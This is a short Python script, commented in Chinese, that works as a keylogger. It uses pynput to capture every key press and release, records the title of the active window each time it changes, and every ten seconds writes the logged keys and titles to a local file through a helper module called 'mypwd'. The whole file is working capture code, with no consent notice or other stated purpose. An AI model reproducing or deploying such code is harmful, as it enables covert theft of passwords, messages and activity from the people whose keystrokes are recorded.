import win32gui as w
from pynput.keyboard import Listener
import copy
import datetime
from threading import Timer

from mypwd import mypwd

TIME_ADDITION = 10  # 定时器，单位 Sec

key_enum = []       # 单次按键数据
keyData = []        # 键盘数据


def on_press(key):
    try:
        if key not in key_enum:
            key_enum.append(key)
        else:
            key_enum.append(key)
    except AttributeError:
        print("key-press error!")


def on_release(key):
    try:
        if len(key_enum):
            keyData.append(copy.deepcopy(key_enum))
            print(keyData)
            key_enum.clear()
    except AttributeError:
        print("key-release error!")


def time_save():

    now = datetime.datetime.now()

    ts =now.strftime('%Y-%m-%d %H:%M:%S')

    print('do func time :', ts)

    pw = mypwd('dat.txt')
    data = []

    data = copy.deepcopy(keyData)

    pw.save_data(data)

    keyData.clear()

    loop_monitor()


def loop_monitor():

    t = Timer(TIME_ADDITION, time_save)

    t.start()


def active_win():
    return w.GetWindowText(w.GetForegroundWindow())


# 设置线程
key_listener = Listener(on_press, on_release)

if __name__ == '__main__':

    loop_monitor()

    # 窗口监听
    tem = 0
    key_listener.start()
    while (1):
        if active_win() != tem:
            print(active_win())
            keyData.append(active_win())
            tem = active_win()
